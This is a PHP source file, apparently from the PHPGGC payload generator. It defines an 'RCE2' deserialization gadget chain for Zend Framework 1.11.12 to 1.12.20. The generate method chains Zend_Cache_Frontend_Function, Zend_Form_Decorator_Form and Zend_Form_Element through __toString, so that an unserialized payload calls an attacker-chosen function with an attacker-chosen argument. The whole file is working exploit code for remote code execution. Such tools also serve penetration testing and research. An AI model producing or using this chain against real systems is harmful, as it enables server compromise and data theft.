<?php

namespace GadgetChain\ZendFramework;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.11.12 <= 1.12.20';
    public static $vector = '__toString';
    public static $author = 'cf';
    public static $information = '
    	Uses zf1/zend-form, which requires zf1/zend-cache.
    ';

    public function generate(array $parameters)
    {
    	$a = new \Zend_Cache_Frontend_Function();
    	$b = new \Zend_Form_Decorator_Form();
    	$c = new \Zend_Form_Element(
    		$parameters['function'],
    		$parameters['parameter'],
    		[$b],
    		$a
    	);
    	return $c;
    }
}